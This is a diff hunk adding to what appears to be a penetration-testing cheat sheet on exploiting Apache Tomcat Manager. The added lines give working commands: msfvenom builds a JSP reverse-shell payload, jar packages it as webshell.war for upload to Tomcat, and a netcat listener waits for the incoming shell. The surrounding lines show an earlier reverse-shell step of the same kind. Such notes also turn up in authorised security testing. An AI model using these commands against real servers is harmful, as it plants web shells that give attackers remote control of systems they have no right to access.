@@ -278,6 +278,24 @@ Create your handler
 nc -nvlp <port>
 
 http://example.com/shell to reverse tcp
+
+
+or
+
+Creating your reverse tcp jsp file
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > index.jsp
+
+Compress your index.jsp file as a war file
+
+jar -cvf webshell.war index.jsp
+
+Upload your war file into apache tomcat
+
+Create your handler
+
+nc -nvlp <PORT>
+
 ```
 Resources for exploiting tomcat manager:
 
